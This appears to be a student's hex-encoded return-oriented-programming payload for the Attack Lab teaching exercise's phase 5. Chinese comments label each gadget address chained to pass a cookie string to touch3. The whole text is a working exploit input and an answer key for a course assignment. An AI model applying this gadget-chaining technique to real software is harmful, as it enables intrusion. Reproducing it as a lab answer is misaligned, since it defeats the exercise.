00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 <- 把 rsp 传给 rax
c5 19 40 00 00 00 00 00 <- 把 rax 传给 rdi
ab 19 40 00 00 00 00 00 （偏移量存到rax）（pop %rax）
37 01 00 00 00 00 00 00 <这一行填偏移量>
dd 19 40 00 00 00 00 00 <- 把 eax 传给 edx
34 1a 40 00 00 00 00 00 <- 把 edx 传给 ecx
13 1a 40 00 00 00 00 00 <- 把 ecx 传给 esi
d6 19 40 00 00 00 00 00 <- 把 rdi 和 rsi 相加，传给 rax
a2 19 40 00 00 00 00 00 <- 把 rax 传给 rdi
fa 18 40 00 00 00 00 00 <- 进入 touch3
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 35
39 62 39 39 37 66 61 00